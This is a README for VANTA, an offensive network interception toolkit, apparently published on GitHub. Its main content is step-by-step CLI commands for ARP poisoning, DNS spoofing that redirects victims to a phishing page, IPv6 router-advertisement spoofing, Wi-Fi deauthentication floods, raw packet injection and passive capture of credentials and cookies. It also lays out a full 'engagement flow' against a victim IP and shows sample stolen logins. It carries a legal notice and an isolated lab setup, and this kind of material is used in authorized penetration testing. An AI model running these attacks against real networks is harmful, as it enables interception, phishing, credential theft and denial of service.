<div align="center">

```
   ██╗   ██╗ █████╗ ███╗   ██╗████████╗ █████╗
   ██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██╔══██╗
   ██║   ██║███████║██╔██╗ ██║   ██║   ███████║
   ╚██╗ ██╔╝██╔══██║██║╚██╗██║   ██║   ██╔══██║
    ╚████╔╝ ██║  ██║██║ ╚████║   ██║   ██║  ██║
     ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝
```

### NETWORK INTERCEPTION SUITE

**built by DEDSEC · "We don't break the network. We become it."**

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-ff003c?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-linux-ff003c?style=flat-square&logo=linux&logoColor=white)]()
[![License](https://img.shields.io/badge/license-MIT-000000?style=flat-square)]()
[![Status](https://img.shields.io/badge/status-active-00ff9c?style=flat-square)]()

</div>

---

## ⚠ Legal Notice

> **VANTA performs active network interception. Every attack it ships is a hostile action on any network you do not own.**
>
> **Use ONLY on:**
> - Networks you own.
> - Isolated lab environments.
> - Engagements with **written authorization** that explicitly names network interception as in-scope.
>
> Unauthorized interception is a **criminal offense** in nearly every jurisdiction — CFAA (US), CMA (UK), PECA (Pakistan), StGB §202a (Germany), and equivalents worldwide.
>
> **You are solely responsible for your use of this tool. DEDSEC assumes no liability for misuse.**

---

## What is VANTA?

VANTA is an offensive network toolkit — a modern Python reimplementation of the classic
MITM arsenal (bettercap, ettercap, dsniff) with a proper state machine, a native GUI,
and clean teardown. Every attack module saves and restores system state automatically:
`/proc/sys` values, firewall rules, ARP tables, and Wi-Fi card mode.

**One tool. Five attack classes. Zero leftover damage.**

---

## Features

| Module | Attack | What it delivers |
|---|---|---|
| **POISON** | ARP spoofing (bidirectional) | Full IPv4 MITM |
| **SHADE** | DNS spoofing | Redirect any domain to any IP |
| **RA** | IPv6 Router Advertisement spoof | IPv6 MITM + rogue DNS via RDNSS |
| **DEAUTH** | 802.11 deauthentication flood | Disconnect any client from any AP |
| **INJECT** | Raw packet crafting | ARP · ICMP · UDP · TCP · DNS |
| **SNARE** | Passive credential + cookie sniffer | HTTP Basic / FTP / POP3 / IMAP / form creds |
| **SERVE** | Built-in phishing page server | Auto-serves a DEDSEC landing page for DNS spoof hits |

**Auto-managed infrastructure:**
- `/proc/sys/net/*` — IPv4/IPv6 forwarding toggled on start, restored on stop
- `firewalld` / `ufw` — required ports opened on start, closed on stop
- Wi-Fi card — managed → monitor on attack, monitor → managed on stop
- ARP tables — poisoned on start, restored (5 rounds) on stop

**Interfaces:** Native GUI (PySide6) + interactive CLI (prompt_toolkit).

---

## Requirements

### System packages

VANTA shells out to a handful of battle-tested tools. On **Fedora / RHEL**:

```bash
sudo dnf install -y \
    python3 python3-pip git \
    iw wireless-tools \
    aircrack-ng hcxtools hcxdumptool \
    dnsmasq hostapd \
    iproute procps
```

On **Debian / Ubuntu / Kali**:

```bash
sudo apt update && sudo apt install -y \
    python3 python3-pip python3-venv git \
    iw wireless-tools \
    aircrack-ng hcxtools hcxdumptool \
    dnsmasq hostapd \
    iproute2 procps
```

On **Arch**:

```bash
sudo pacman -S --needed \
    python python-pip git \
    iw wireless_tools \
    aircrack-ng hcxtools hcxdumptool \
    dnsmasq hostapd \
    iproute2 procps
```

### Python dependencies

Declared in `pyproject.toml` / `requirements.txt`:

```
scapy>=2.5.0
colorama>=0.4.6
PySide6>=6.6.0
dnslib>=0.9.24
rich>=13.7.0
prompt_toolkit>=3.0.0
```

### Hardware

| Module | Card requirement |
|---|---|
| POISON · SHADE · RA · INJECT · SNARE · SERVE | Any network adapter |
| **DEAUTH** | Wi-Fi card that supports **monitor mode** (verified: `iw phy \| grep monitor`) |

Most modern laptop Wi-Fi cards (Intel `iwlwifi`, Atheros `ath9k`, Realtek `rtl8812au`) support monitor mode.
VANTA auto-detects capability and refuses to launch DEAUTH if the card can't inject — with a clear reason.

---

## Install

```bash
git clone https://github.com/Unknownx007/vanta
cd vanta

python3 -m venv venv
source venv/bin/activate

pip install -e .
```

Verify:

```bash
python -m vanta --version
# VANTA 1.0.0  (DEDSEC)
```

---

## Usage

> **Every operation that touches the network requires root.**
> Always invoke VANTA with `sudo` and with the venv's Python binary explicitly.

### GUI (default)

```bash
sudo ./venv/bin/python -m vanta
```

A legal disclaimer window opens. Tick the acknowledgement → **PROCEED** → the dashboard loads.

### CLI

```bash
sudo ./venv/bin/python -m vanta --cli
```

You'll land at the `vanta »` prompt.

```text
vanta » help
vanta » ifaces
vanta » set iface wlp1s0
vanta » scan
vanta » targets
vanta » poison start
vanta » dns rule example.com 192.168.0.100
vanta » dns start
vanta » snare start
vanta » creds
vanta » status
vanta » exit
```

---

## Attack reference

### 1 · ARP Poison (POISON)

Position yourself between a target and the gateway. All target IPv4 traffic
flows through your host. Requires IP forwarding (managed automatically).

**GUI:** POISON tab → set Target IP → **▶ START POISON**

**CLI:**
```text
vanta » set target 192.168.0.101
vanta » poison start
...
vanta » poison stop
```

**What you get:** full MITM. Subsequent SNARE capture shows the target's HTTP credentials and cookies.

---

### 2 · DNS Spoof (SHADE)

Forge DNS responses for chosen domains. Pair with POISON to make it effective
(the target's queries must reach your host first).

**CLI:**
```text
vanta » dns rule example.com 192.168.0.100
vanta » dns rule * 192.168.0.100          # wildcard
vanta » dns start
```

**Auto-serve mode** — pair DNS spoof with the built-in HTTP server so a spoofed
domain immediately lands on a phishing page:

```text
vanta » serve start 80
vanta » dns start
```

Then open `http://example.com` on the target. VANTA serves the DEDSEC landing page.

To load your own HTML:

```text
vanta » set serve_page /path/to/phishing.html
```

---

### 3 · IPv6 RA Spoof (RA)

Advertise yourself as the IPv6 gateway. Devices that prefer IPv6 (Android, iOS,
Windows 10+) send their IPv6 traffic through you. Bypasses any IPv4-only defenses.

**CLI:**
```text
vanta » ra start
```

Then on the target device, check its IPv6 address list — a new `fd00:dead:beef:1::/64`
address appears, generated from your forged prefix.

**Auto-managed:** IPv6 forwarding enabled, `accept_ra`/`autoconf` silenced on the
attacker's interface, all restored on stop.

---

### 4 · Deauth Flood (DEAUTH)

Disconnect any 802.11 client from any AP. Requires monitor mode.

**GUI:** DEAUTH tab → **⟳ SCAN FOR APs** → pick a network → **▶ START DEAUTH**

**CLI:**
```text
vanta » wifi check                # verify card capability
vanta » wifi scan                 # list nearby APs
vanta » deauth bssid c8:3a:35:10:00:98
vanta » deauth bssid c8:3a:35:10:00:98 client d6:6b:95:31:7c:7f
vanta » deauth stop               # stops and resets the card
```

**Wireless capability check:**
```text
vanta » wifi check
iface        wlp1s0
driver       iwlwifi
monitor      YES
injection    YES
note         iwlwifi: injection works with TXFlags=NOSEQ+ORDER
```

The card is automatically restored to managed mode on stop. If the tool
crashes hard, run:

```bash
sudo iw dev wlp1s0 set type managed
sudo systemctl restart NetworkManager
```

---

### 5 · Packet Inject (INJECT)

Craft and send single raw frames. Useful for RST injection, ICMP redirects,
and custom protocol testing.

**CLI:**
```text
vanta » inject icmp dst=1.1.1.1
vanta » inject tcp dst=192.168.0.1 dport=80 flags=S
vanta » inject udp dst=192.168.0.1 dport=53 payload=hello
vanta » inject arp ip=192.168.0.1 mac=aa:bb:cc:dd:ee:ff target=192.168.0.101
vanta » inject dns domain=example.com server=8.8.8.8
```

---

### 6 · SNARE — passive credential capture

Runs independently of the attack modules. Watches for HTTP Basic, form
submissions, FTP / POP3 / IMAP logins, and cookies.

**CLI:**
```text
vanta » snare start
vanta » creds
vanta » cookies
vanta » requests
vanta » snare stop
```

**Sample output:**
```
[SNARE] BASIC-AUTH  192.168.0.101 → 192.168.0.1  admin:admin
[SNARE] COOKIE      192.168.0.101 → 192.168.0.1  session=abc123…
[SNARE] DNS: example.com → 192.168.0.100
```

---

## Typical engagement flow

```text
1.  sudo ./venv/bin/python -m vanta
2.  IFACE = wlp1s0   →  SCAN
3.  TARGET = <victim IP>   →  APPLY TARGET
4.  SNARE START
5.  POISON START
6.  DNS tab   →  serve start 80
                dns rule example.com 192.168.0.100
                dns start
7.  RA tab    →  START RA SPOOF
8.  Watch the LIVE LOG for captured creds, cookies, and hijacked DNS.
9.  STOP all   →  the tool restores ARP, sysctl, firewall, and card mode.
```

---

## Test lab (no internet required)

Two ways to verify every module without touching a production network.

### A · Linux network namespaces

```bash
sudo tests/lab_setup.sh
```

Creates four isolated namespaces on a virtual bridge:

| Name | IP | Role |
|---|---|---|
| vanta-gw | 10.66.0.1 | simulated gateway |
| vanta-victim | 10.66.0.10 | target |
| vanta-attacker | 10.66.0.66 | runs VANTA |
| vanta-dns | 10.66.0.53 | stub DNS |

```bash
sudo ip netns exec vanta-attacker bash
cd ~/github/vanta
sudo ./venv/bin/python -m vanta --cli
```

Tear down with `sudo tests/lab_setup.sh --cleanup`.

### B · Old router (physical lab)

Any 2.4 GHz router you own works. Configure:

- WPA2-PSK / AES
- AP isolation **OFF**
- DHCP pool small (`192.168.0.100–200`)

Connect attacker laptop + victim phone. Verified working on a Tenda 3G611R+.

---

## Troubleshooting

### "cannot enter monitor mode"

```bash
iw phy | grep -A 12 "Supported interface modes"
```

If `* monitor` isn't present, the card cannot do this attack. Intel, Atheros,
Realtek USB adapters almost always work.

If it's missing:

```bash
sudo pkill NetworkManager
sudo ip link set wlp1s0 down
sudo iw wlp1s0 set type monitor
sudo ip link set wlp1s0 up
sudo iw dev wlp1s0 info
```

### "sudo: vanta: command not found"

`sudo` resets `PATH`. Always invoke with the full path:

```bash
sudo ./venv/bin/python -m vanta
```

Or add an alias to `~/.bashrc` / `~/.zshrc`:

```bash
alias vanta='sudo '"$PWD"'/venv/bin/python -m vanta'
```

### GUI shows DBus warnings

```
qt.qpa.theme.dbus: Session DBus not running.
```

Cosmetic. Qt can't reach the session bus under `sudo`. To silence:

```bash
sudo -E env "PATH=$PATH" \
    DBUS_SESSION_BUS_ADDRESS="$DBUS_SESSION_BUS_ADDRESS" \
    ./venv/bin/python -m vanta
```

### Laptop doesn't reconnect after DEAUTH

```bash
sudo iw dev wlp1s0 set type managed
sudo ip link set wlp1s0 up
sudo systemctl restart NetworkManager
```

### Host firewall blocks the SERVE module

VANTA auto-opens the port via `firewall-cmd` or `ufw`. If both are absent
and the port is blocked by nftables directly:

```bash
sudo nft add rule inet filter input tcp dport 80 accept
```

---

## Roadmap

- [x] ARP poisoning
- [x] DNS spoofing + built-in phishing server
- [x] IPv6 RA spoofing
- [x] 802.11 deauth flood
- [x] Raw packet injection
- [x] Auto firewall / sysctl / card management
- [ ] SSL strip + HSTS bypass
- [ ] WPS PIN brute-force
- [ ] PMKID capture + hashcat bridge
- [ ] Rogue AP / evil twin (needs a second Wi-Fi adapter)
- [ ] Report export to PDF
- [ ] Session persistence in SQLite

---

## GitHub topics

Copy-paste into the repo settings → Topics field:

```
network-security  penetration-testing  red-team  ethical-hacking  mitm
arp-spoofing  dns-spoofing  ipv6  wifi  deauth  packet-injection
scapy  pyqt6  pyside6  linux  python3  security-tools  dedsec
offensive-security  network-interception
```

---

## Directory layout

```
vanta/
├── vanta/
│   ├── __main__.py          entry point (GUI / CLI dispatch)
│   ├── banner.py            ASCII + quotes
│   ├── theme.py             color tokens (CLI ANSI + GUI hex)
│   ├── core/
│   │   ├── config.py        runtime config
│   │   ├── logger.py        structured logger (CLI + GUI feed)
│   │   ├── iface.py         interface enumeration
│   │   ├── arp_table.py     ARP cache + ping sweep
│   │   ├── sysctl.py        /proc/sys save/restore
│   │   ├── firewall.py      firewalld / ufw auto-rules
│   │   └── wireless.py      monitor mode + capability detection
│   ├── attacks/
│   │   ├── base.py          Attack base class + state machine
│   │   ├── poison.py        ArpPoison
│   │   ├── shade.py         DnsSpoofer
│   │   ├── ra.py            RaSpoofer
│   │   ├── deauth.py        Deauther + ApScanner
│   │   └── inject.py        PacketInjector
│   ├── sniff/
│   │   ├── snare.py         passive credential sniffer
│   │   └── parsers.py       HTTP / FTP / POP3 / IMAP parsers
│   ├── serve/
│   │   └── server.py        FakeServer (phishing pages)
│   ├── report/
│   │   ├── session.py       session model
│   │   └── export.py        JSON / HTML report
│   ├── cli/
│   │   ├── shell.py         interactive REPL
│   │   ├── commands.py      command registry
│   │   └── render.py        colored tables
│   └── gui/
│       ├── app.py           main window
│       ├── disclaimer.py    pre-launch legal gate
│       ├── theme.qss        stylesheet
│       └── widgets/         console · targets · attack panel · stats · logo
├── tests/
│   └── lab_setup.sh         namespace lab
├── docs/
│   ├── LAB.md
│   └── LEGAL.md
├── pyproject.toml
├── requirements.txt
└── README.md
```

---

## Credits

**Built by DEDSEC.** Patterned after the classic MITM toolkit lineage —
bettercap, ettercap, dsniff, aircrack-ng, wifite2 — but rebuilt in modern Python
with a real GUI, clean state machine, and zero-damage teardown.

Inspiration and behavioral reference:

- **Wifite2** — deauth burst structure and reason code cycling
- **Wi-Jam-X** — universal in-place monitor mode switch
- **bettercap** — ARP poisoning + DNS spoof architecture
- **aircrack-ng** — scanning tools and injection test patterns

---

## License

MIT © DEDSEC. See `LICENSE`.

<div align="center">

*"We don't break the network. We become it."*

</div>
